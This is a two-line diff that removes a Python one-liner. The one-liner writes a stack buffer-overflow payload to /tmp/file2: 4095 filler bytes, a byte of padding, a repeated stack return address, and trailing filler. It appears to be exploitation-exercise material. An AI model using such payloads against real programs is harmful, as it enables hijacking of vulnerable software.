@@ -1,2 +1,0 @@
-python -c "print 'A' * 4095 + '\n' + 'i' + '\xf0\xf7\xff\xbf'*3 + 'B'*30" >
-/tmp/file2
